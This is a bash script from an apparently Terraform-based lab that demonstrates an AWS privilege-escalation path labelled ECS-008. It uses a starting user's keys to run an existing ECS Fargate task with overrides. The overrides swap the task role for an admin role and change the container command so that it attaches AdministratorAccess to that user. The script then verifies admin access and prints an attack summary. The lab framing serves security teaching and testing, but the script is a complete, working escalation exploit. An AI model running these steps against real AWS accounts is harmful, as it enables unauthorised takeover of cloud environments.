#!/bin/bash

# Demo script for iam:PassRole + ecs:RunTask privilege escalation (ECS-008)
# This scenario demonstrates how a user with iam:PassRole and ecs:RunTask can
# override an EXISTING task definition's command and taskRoleArn to escalate
# to admin via Fargate -- WITHOUT needing ecs:RegisterTaskDefinition.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-ecs-008-to-admin-starting-user"
EXISTING_TASK_FAMILY="pl-prod-ecs-008-existing-task"
ADMIN_POLICY_ARN="arn:aws:iam::aws:policy/AdministratorAccess"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + ECS RunTask (Command Override) Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

echo -e "${BLUE}Key Insight: Unlike ECS-004, this attack does NOT require${NC}"
echo -e "${BLUE}ecs:RegisterTaskDefinition. The attacker overrides an existing${NC}"
echo -e "${BLUE}task definition's command and taskRoleArn at runtime using${NC}"
echo -e "${BLUE}the --overrides parameter of ecs:RunTask.${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_ecs_008_iam_passrole_ecs_runtask.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
TARGET_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.target_role_arn')
TARGET_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.target_role_name')
CLUSTER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.cluster_name')
EXISTING_TASK_DEF_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.existing_task_definition_arn')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Retrieve readonly credentials
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo "ECS Cluster: $CLUSTER_NAME"
echo "Target Role: $TARGET_ROLE_NAME"
echo "Existing Task Definition: $EXISTING_TASK_DEF_ARN"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_user_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_user_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}Warning: Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [OBSERVATION] Check current policies attached to starting user
# Step 5: Check current policies attached to starting user
use_readonly_creds
echo -e "${YELLOW}Step 5: Checking current policies attached to starting user${NC}"
echo "Listing attached policies for: $STARTING_USER"
show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].PolicyName' --output text"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].PolicyName' --output text)
if [ -z "$ATTACHED_POLICIES" ]; then
    echo "No managed policies currently attached"
else
    echo "Currently attached policies: $ATTACHED_POLICIES"
fi
echo -e "${GREEN}✓ Verified current policy state${NC}\n"

# [OBSERVATION] Discover existing task definitions in the cluster
# Step 6: List existing task definitions to find the pre-deployed one
echo -e "${YELLOW}Step 6: Discovering existing task definition${NC}"
echo "Listing task definitions in family: $EXISTING_TASK_FAMILY"
show_cmd "ReadOnly" "aws ecs list-task-definitions --region $AWS_REGION --family-prefix $EXISTING_TASK_FAMILY --status ACTIVE --query 'taskDefinitionArns[*]' --output text"

TASK_DEFS=$(aws ecs list-task-definitions \
    --region $AWS_REGION \
    --family-prefix $EXISTING_TASK_FAMILY \
    --status ACTIVE \
    --query 'taskDefinitionArns[*]' \
    --output text)

if [ -z "$TASK_DEFS" ] || [ "$TASK_DEFS" == "None" ]; then
    echo -e "${RED}Error: No existing task definitions found in family: $EXISTING_TASK_FAMILY${NC}"
    exit 1
fi

echo "Found existing task definitions:"
for td in $TASK_DEFS; do
    echo "  - $td"
done

# Use the latest task definition
LATEST_TASK_DEF=$(echo "$TASK_DEFS" | awk '{print $NF}')
echo ""
echo "Using task definition: $LATEST_TASK_DEF"
echo -e "${GREEN}✓ Found existing task definition to override${NC}\n"

# [OBSERVATION] Discover VPC and subnet configuration for ECS task
# Step 7: Find network configuration for ECS task
echo -e "${YELLOW}Step 7: Finding network configuration for ECS task${NC}"

# Get default VPC
show_cmd "ReadOnly" "aws ec2 describe-vpcs --region $AWS_REGION --filters 'Name=is-default,Values=true' --query 'Vpcs[0].VpcId' --output text"
DEFAULT_VPC=$(aws ec2 describe-vpcs \
    --region $AWS_REGION \
    --filters "Name=is-default,Values=true" \
    --query 'Vpcs[0].VpcId' \
    --output text)

if [ -z "$DEFAULT_VPC" ] || [ "$DEFAULT_VPC" == "None" ]; then
    echo -e "${RED}Error: Could not find default VPC${NC}"
    echo "Please ensure a default VPC exists in region: $AWS_REGION"
    exit 1
fi

echo "Default VPC: $DEFAULT_VPC"

# Get a subnet from the default VPC
show_cmd "ReadOnly" "aws ec2 describe-subnets --region $AWS_REGION --filters 'Name=vpc-id,Values=$DEFAULT_VPC' --query 'Subnets[0].SubnetId' --output text"
DEFAULT_SUBNET=$(aws ec2 describe-subnets \
    --region $AWS_REGION \
    --filters "Name=vpc-id,Values=$DEFAULT_VPC" \
    --query 'Subnets[0].SubnetId' \
    --output text)

if [ -z "$DEFAULT_SUBNET" ] || [ "$DEFAULT_SUBNET" == "None" ]; then
    echo -e "${RED}Error: Could not find subnet in default VPC${NC}"
    exit 1
fi

echo "Using Subnet: $DEFAULT_SUBNET"
echo -e "${GREEN}✓ Network configuration identified${NC}\n"

# [EXPLOIT] Run ECS task with overridden command and admin role
# Step 8: Run the ECS task with overrides (the privilege escalation)
use_starting_user_creds
echo -e "${YELLOW}Step 8: Running ECS task with command and taskRoleArn overrides${NC}"
echo -e "${RED}This is the privilege escalation vector!${NC}"
echo ""
echo "Cluster: $CLUSTER_NAME"
echo "Existing Task Definition: $EXISTING_TASK_FAMILY"
echo "Override taskRoleArn: $TARGET_ROLE_ARN (admin role)"
echo "Override command: aws iam attach-user-policy (AdministratorAccess -> $STARTING_USER)"
echo ""
echo "The --overrides parameter allows us to:"
echo "  1. Replace the taskRoleArn with the admin role (via iam:PassRole)"
echo "  2. Replace the container command with our malicious payload"
echo ""

# Build the overrides JSON
OVERRIDES=$(cat <<EOF
{
  "taskRoleArn": "$TARGET_ROLE_ARN",
  "containerOverrides": [
    {
      "name": "app",
      "command": [
        "iam",
        "attach-user-policy",
        "--user-name",
        "$STARTING_USER",
        "--policy-arn",
        "$ADMIN_POLICY_ARN"
      ]
    }
  ]
}
EOF
)

show_attack_cmd "Attacker" "aws ecs run-task --region $AWS_REGION --cluster $CLUSTER_NAME --task-definition $EXISTING_TASK_FAMILY --launch-type FARGATE --network-configuration \"awsvpcConfiguration={subnets=[$DEFAULT_SUBNET],assignPublicIp=ENABLED}\" --overrides '$OVERRIDES'"
RUN_TASK_RESULT=$(aws ecs run-task \
    --region $AWS_REGION \
    --cluster $CLUSTER_NAME \
    --task-definition $EXISTING_TASK_FAMILY \
    --launch-type FARGATE \
    --network-configuration "awsvpcConfiguration={subnets=[$DEFAULT_SUBNET],assignPublicIp=ENABLED}" \
    --overrides "$OVERRIDES" \
    --output json)

TASK_ARN=$(echo "$RUN_TASK_RESULT" | jq -r '.tasks[0].taskArn')
FAILURES=$(echo "$RUN_TASK_RESULT" | jq -r '.failures | length')

if [ "$FAILURES" != "0" ] || [ -z "$TASK_ARN" ] || [ "$TASK_ARN" == "null" ]; then
    echo -e "${RED}Error: Failed to run ECS task${NC}"
    echo "Failures:"
    echo "$RUN_TASK_RESULT" | jq '.failures'
    exit 1
fi

echo "Task ARN: $TASK_ARN"
echo -e "${GREEN}✓ Successfully started ECS task with overrides!${NC}\n"

# [OBSERVATION] Poll task status until completion
# Step 9: Wait for task to complete
use_readonly_creds
echo -e "${YELLOW}Step 9: Waiting for ECS task to complete${NC}"
echo "Monitoring task status..."

MAX_ATTEMPTS=30
ATTEMPT=0
TASK_STATUS="UNKNOWN"

while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
    ATTEMPT=$((ATTEMPT + 1))

    # Get task status
    show_cmd "ReadOnly" "aws ecs describe-tasks --region $AWS_REGION --cluster $CLUSTER_NAME --tasks $TASK_ARN --output json"
    TASK_INFO=$(aws ecs describe-tasks \
        --region $AWS_REGION \
        --cluster $CLUSTER_NAME \
        --tasks $TASK_ARN \
        --output json 2>/dev/null)

    if [ $? -eq 0 ]; then
        TASK_STATUS=$(echo "$TASK_INFO" | jq -r '.tasks[0].lastStatus')
        TASK_DESIRED_STATUS=$(echo "$TASK_INFO" | jq -r '.tasks[0].desiredStatus')

        echo "Attempt $ATTEMPT: Task status: $TASK_STATUS (desired: $TASK_DESIRED_STATUS)"

        # Check if task has stopped
        if [ "$TASK_STATUS" == "STOPPED" ]; then
            STOP_CODE=$(echo "$TASK_INFO" | jq -r '.tasks[0].stopCode // "N/A"')
            EXIT_CODE=$(echo "$TASK_INFO" | jq -r '.tasks[0].containers[0].exitCode // "N/A"')
            echo "Task stopped with code: $STOP_CODE"
            echo "Container exit code: $EXIT_CODE"

            if [ "$EXIT_CODE" == "0" ]; then
                echo -e "${GREEN}✓ Task completed successfully!${NC}"
                break
            else
                echo -e "${YELLOW}Warning: Task stopped but may have had issues (exit code: $EXIT_CODE)${NC}"
                break
            fi
        fi
    else
        echo "Warning: Could not describe task (attempt $ATTEMPT)"
    fi

    sleep 5
done

if [ $ATTEMPT -ge $MAX_ATTEMPTS ]; then
    echo -e "${YELLOW}Warning: Timeout waiting for task completion${NC}"
    echo "Continuing anyway - the policy may have been attached..."
fi
echo ""

# Step 10: Wait for IAM policy to propagate
echo -e "${YELLOW}Step 10: Waiting for IAM policy changes to propagate${NC}"
echo "IAM changes can take time to propagate across AWS infrastructure..."
sleep 15
echo -e "${GREEN}✓ IAM policy propagation complete${NC}\n"

# [OBSERVATION] Verify policy was attached to starting user
# Step 11: Verify policy was attached to starting user
echo -e "${YELLOW}Step 11: Verifying policy attachment${NC}"
echo "Checking attached policies for: $STARTING_USER"
show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' --output text"

ATTACHED_POLICIES_AFTER=$(aws iam list-attached-user-policies \
    --user-name $STARTING_USER \
    --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \
    --output text)

if [ -z "$ATTACHED_POLICIES_AFTER" ]; then
    echo -e "${RED}Warning: No policies found attached to user${NC}"
    echo "The ECS task may not have completed successfully"
else
    echo "Currently attached policies:"
    echo "$ATTACHED_POLICIES_AFTER"

    if echo "$ATTACHED_POLICIES_AFTER" | grep -q "AdministratorAccess"; then
        echo -e "${GREEN}✓ AdministratorAccess policy successfully attached!${NC}"
    else
        echo -e "${YELLOW}Warning: AdministratorAccess not found in attached policies${NC}"
    fi
fi
echo ""

# Step 12: Verify admin access
echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."
show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"

if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}Failed to list users${NC}"
    echo "The privilege escalation may not have completed successfully"
    exit 1
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole + ecs:RunTask)"
echo "2. Discovered existing task definition: $EXISTING_TASK_FAMILY"
echo "3. Used ecs:RunTask with --overrides to:"
echo "   a. Override taskRoleArn to admin role: $TARGET_ROLE_NAME"
echo "   b. Override container command to attach AdministratorAccess"
echo "4. ECS Fargate task ran with admin role and attached policy to starting user"
echo "5. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER -> (RunTask with --overrides on $EXISTING_TASK_FAMILY)"
echo "  -> ECS Task with $TARGET_ROLE_NAME -> AttachUserPolicy"
echo "  -> $STARTING_USER gains AdministratorAccess -> Admin"

echo -e "\n${YELLOW}Key Difference from ECS-004:${NC}"
echo "  ECS-004 requires: iam:PassRole + ecs:RegisterTaskDefinition + ecs:RunTask"
echo "  ECS-008 requires: iam:PassRole + ecs:RunTask (only!)"
echo "  The --overrides parameter eliminates the need to register a new task definition."

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- ECS Cluster: $CLUSTER_NAME"
echo "- Task ARN: $TASK_ARN"
echo "- Policy attached to user: AdministratorAccess"

echo -e "\n${RED}⚠ Warning: The starting user now has AdministratorAccess policy attached${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
